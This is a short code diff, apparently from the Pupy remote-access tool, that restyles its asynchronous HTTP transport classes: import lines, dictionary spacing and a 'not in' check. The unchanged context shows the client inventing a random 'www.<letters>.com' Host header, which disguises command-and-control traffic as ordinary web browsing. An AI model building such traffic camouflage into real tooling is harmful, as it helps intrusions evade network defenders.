@@ -11,7 +11,10 @@ __all__ = (
 )
 
 from ..base import BasePupyTransport
-import base64, random, string, logging
+import base64
+import random
+import string
+import logging
 
 class InvalidHTTPReq(Exception):
     __slots__ = ()
@@ -52,10 +55,10 @@ class PupyAsyncHTTPClient(PupyAsyncHTTPTransport):
 
     def __init__(self, *args, **kwargs):
         PupyAsyncHTTPTransport.__init__(self, *args, **kwargs)
-        self.headers={"User-Agent" : self.user_agent}
+        self.headers={"User-Agent": self.user_agent}
         if self.host is not None:
             self.headers["Host"]=self.host
-        if not "Host" in self.headers:
+        if "Host" not in self.headers:
             self.headers["Host"]="www."+''.join(random.choice(string.ascii_lowercase) for _ in range(0, random.randint(7,10)))+".com"
 
     def upstream_recv(self, data):
@@ -124,8 +127,8 @@ class PupyAsyncHTTPServer(PupyAsyncHTTPTransport):
     def __init__(self, *args, **kwargs):
         PupyAsyncHTTPTransport.__init__(self, *args, **kwargs)
         self.headers={
-            "Content-Type" : "text/html; charset=utf-8",
-            "Server" : self.server_header,
+            "Content-Type": "text/html; charset=utf-8",
+            "Server": self.server_header,
             }
 
     def upstream_recv(self, data):
